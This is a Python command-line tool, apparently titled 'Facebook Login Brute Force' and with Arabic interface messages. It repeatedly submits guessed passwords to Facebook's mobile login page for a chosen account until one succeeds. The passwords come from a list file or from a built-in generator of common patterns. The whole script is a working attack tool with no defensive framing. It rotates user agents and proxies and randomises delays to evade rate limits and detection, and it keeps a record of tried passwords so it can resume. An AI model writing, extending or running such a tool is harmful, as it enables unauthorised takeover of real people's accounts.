import sys
import os
import requests
import random
import logging
import time
from bs4 import BeautifulSoup
from termcolor import colored

# =============> Console Colors <=============
class CliColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# =============> Config <=============
MIN_PASSWORD_LENGTH = 6
MAIN_FB_DOMAIN = 'https://mbasic.facebook.com'
LOGIN_URL = MAIN_FB_DOMAIN + '/login.php'
DEFAULT_TIMEOUT = 1
USER_AGENTS = []
with open('user-agents.txt', 'rt', encoding='utf-8') as file:
    USER_AGENTS = file.read().splitlines()
PROXIES = []
with open('proxies.txt', 'rt', encoding='utf-8') as file:
    PROXIES = file.read().splitlines()
PAYLOAD = {}
COOKIES = {}
HEADERS = {}

# =============> Log <=============
class Log(object):
    def __init__(self, filename):
        self.filename = filename
        self.logging = logging
        self.logging.basicConfig(
            format='%(asctime)s %(levelname)s: %(message)s',
            datefmt='%Y/%m/%d %I:%M:%S %p',
            filename=filename,
            level=self.logging.INFO,
            encoding='utf-8'
        )

    def write_colored(self, msg, color=''):
        try:
            if color:
                print(colored(msg, color))
            else:
                print(msg)
        except:
            print(msg.encode('utf-8', errors='ignore').decode())
        self.logging.info(msg)

# =============> Functions <=============
def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'referer': LOGIN_URL,
        'content-type': 'application/x-www-form-urlencoded',
        'origin': MAIN_FB_DOMAIN
    }

def form_data(use_proxy=False):
    form = {}
    cookies = {
        'wd': '1366x663',
        'm_pixel_ratio': '1',
        'locale': 'en_US'
    }
    headers = get_random_headers()
    proxy = {'http': random.choice(PROXIES)} if use_proxy else None

    res = requests.get(LOGIN_URL, headers=headers, proxies=proxy, timeout=DEFAULT_TIMEOUT)
    soup = BeautifulSoup(res.text, 'html.parser')
    form_tag = soup.find('form')
    if not form_tag:
        raise Exception("لم يتم العثور على نموذج تسجيل الدخول.")

    input_tag = form_tag.find('input', {'name': 'lsd'})
    if input_tag and input_tag.has_attr('value'):
        form['lsd'] = input_tag['value']

    for i in res.cookies:
        cookies[i.name] = i.value

    return form, cookies

def Login(user, password, use_proxy=False):
    global PAYLOAD, COOKIES, HEADERS
    if not PAYLOAD or not COOKIES:
        PAYLOAD, COOKIES = form_data(use_proxy)
    if not HEADERS:
        HEADERS = get_random_headers()
    PAYLOAD['email'] = user
    PAYLOAD['pass'] = password
    proxy = {'http': random.choice(PROXIES)} if use_proxy else None

    r = requests.post(LOGIN_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS, proxies=proxy, timeout=DEFAULT_TIMEOUT)
    rtext = r.text.lower()
    if 'logout' in rtext or 'log out' in rtext:
        return [True, password]
    return [False, password]

# =============> Password Generation <=============
def generate_passwords(user):
    passwords = [
        user + "123",
        user + "2024",
        user + "password",
        user + "@123",
        "password123",
        "123456",
        "admin123",
        user.lower(),
        user.upper(),
        user + "admin",
        user + "123456",
        user + "password123",
        "admin2024",
        "user@123",
        user + "hello",
        user + "الصفحة2024",
        user + "admin2024",
        user + "12345"
    ]
    return passwords

# =============> Store Attempted Passwords <=============
def store_attempted_password(password):
    with open('attempted-passwords.txt', 'a', encoding='utf-8') as file:
        file.write(password + '\n')

def load_attempted_passwords():
    if os.path.exists('attempted-passwords.txt'):
        with open('attempted-passwords.txt', 'r', encoding='utf-8') as file:
            return set(file.read().splitlines())
    return set()

# =============> Arguments <=============
def args():
    import argparse
    parser = argparse.ArgumentParser(description='Facebook Login Brute Force')
    parser.add_argument('-u', '--user', help='Email/Username/ID/Phone')
    parser.add_argument('-p', '--password-list', help='Password List Filename')
    parser.add_argument('-sp', '--single-password', help='Password')
    parser.add_argument('--use-proxy', action='store_true', help='Use Proxies')
    parser.add_argument('-l', '--log', help='Log Filename')
    parser.add_argument('-g', '--generate', action='store_true', help='Generate Passwords Automatically')
    parser.set_defaults(use_proxy=False)
    return parser.parse_args()

# =============> Main <=============
def main(args=None):
    print(CliColors.HEADER + """
 ____  __    ___  ____  ____   __    __  __ _     ____  ____  _  _  ____  ____     ____  __  ____   ___  ____ 
(  __)/ _\  / __)(  __)(  _ \ /  \  /  \(  / )___(  _ \(  _ \/ )( \(_  _)(  __)___(  __)/  \(  _ \ / __)(  __)
 ) _)/    \( (__  ) _)  ) _ ((  O )(  O ))  ((___)) _ ( )   /) \/ (  )(   ) _)(___)) _)(  O ))   /( (__  ) _) 
(__) \_/\_/ \___)(____)(____/ \__/  \__/(__\_)   (____/(__\_)\____/ (__) (____)   (__)  \__/(__\_) \___)(____)
""")

    if args and args.single_password and args.password_list:
        print(CliColors.FAIL + "[x] لا يمكنك استخدام كلمة مرور مفردة وقائمة كلمات مرور في آن واحد.")
        sys.exit(-2)

    log_filename = args.log if args and args.log else 'logging.log'
    _log = Log(log_filename)

    attempted_passwords = load_attempted_passwords()

    if args and args.single_password:
        passwords = [args.single_password]
    elif args and args.generate:
        if args.user:
            passwords = generate_passwords(args.user)
        else:
            print(CliColors.FAIL + "[x] الرجاء توفير اسم مستخدم مع -u لتوليد كلمات المرور.")
            sys.exit(-1)
    else:
        password_file = args.password_list if args and args.password_list else input(CliColors.OKBLUE + "[?] اسم ملف كلمات المرور: \t")
        if os.path.exists(password_file):
            with open(password_file, 'rt', encoding='utf-8') as file:
                passwords = file.read().replace("\r\n", "\n").replace("\r", "\n").split("\n")
        else:
            print(CliColors.FAIL + "[x] الملف غير موجود.")
            sys.exit(-1)

    user = args.user if args and args.user else input(CliColors.OKBLUE + "[?] البريد الإلكتروني أو اسم المستخدم أو رقم الهاتف: \t")

    print("\n" + CliColors.OKCYAN + "[*] جاري التجريب...")

    start_time = time.time()
    flag = [False, None]
    for index, password in enumerate(passwords, 1):
        password = password.strip()
        if password in attempted_passwords:
            continue
        try:
            if len(password) < MIN_PASSWORD_LENGTH:
                _log.write_colored(f"[!] كلمة المرور '{password}' أقل من {MIN_PASSWORD_LENGTH} وتم تجاهلها.", 'grey')
                continue

            _log.write_colored(f"[*] المحاولة #{index} باستخدام: '{user}' وكلمة المرور: '{password}'" + (" [بروكسي]" if args.use_proxy else ""), 'yellow')
            success, tried_password = Login(user, password, args.use_proxy)
            if success:
                flag = [True, tried_password]
                break

            store_attempted_password(password)
            time.sleep(random.uniform(0.5, 1.5))
        except Exception as ex:
            _log.write_colored(f"[!] حدث خطأ: {str(ex)}", 'red')

    end_time = round(time.time() - start_time, 2)

    if flag[0]:
        _log.write_colored(f"[+] تم العثور على كلمة المرور: '{flag[1]}'", 'green')
    else:
        _log.write_colored("[-] لم يتم العثور على كلمة مرور صحيحة.", 'red')

    _log.write_colored(f"انتهت العملية في {end_time} ثانية.", 'magenta')
    print("")

if __name__ == '__main__':
    sys.exit(main(args()))
